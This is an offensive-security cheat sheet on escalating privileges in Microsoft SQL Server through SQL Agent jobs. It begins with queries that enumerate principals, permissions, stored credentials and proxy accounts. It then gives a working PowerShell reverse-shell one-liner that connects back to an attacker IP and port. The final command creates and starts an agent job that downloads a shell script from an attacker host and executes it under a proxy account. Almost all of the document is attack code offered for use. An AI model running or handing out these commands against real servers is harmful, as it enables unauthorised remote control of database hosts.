---
title: "MSSQL Agent Jobs"
date: 2024-8-3
tags: ["Database Dumping", "Privilege Escalation In Databases", "Mssql", "Database", "Windows", "Agent Jobs"]
---

### 1. Pre-check

```console
# List principals
SELECT name FROM sys.database_principals;
```

```console
# Check privilege over a principal from current user
SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER');
```

```console
# Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS"
SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER');
```

```console
# Check SQL credentials
SELECT name, credential_identity FROM sys.credentials;
```

### 2. Check proxy account name and permissions

```console
# Create a table to store info
CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255));
```

```console
# Insert proxy info into table
EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.dbo.sp_enum_proxy_for_subsystem;
```

```console
# Show proxy info
SELECT subsystem_name, proxy_name FROM proxies;
```

### 3. Create agent job

#### Powershell #2

```console
$client = New-Object System.Net.Sockets.TCPClient('<LOCAL_IP>',<LOCAL_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Create job

```console
USE msdb; EXEC AS LOGIN='<PRINCIPAL>'; EXEC dbo.sp_add_job @job_name=N'ANYTHING'; EXEC dbo.sp_add_jobserver @job_name=N'ANYTHING'; EXEC dbo.sp_add_jobstep @job_name = N'ANYTHING', @step_name=N'ExecPayload', @subsystem=N'CmdExec', @command='powershell.exe iex(iwr http://<LOCAL_IP>/shell.ps1)|iex', @retry_attempts=5, @retry_interval=5, @proxy_name=N'<PROXY_NAME>'; EXEC dbo.sp_start_job @job_name = N'ANYTHING';
```
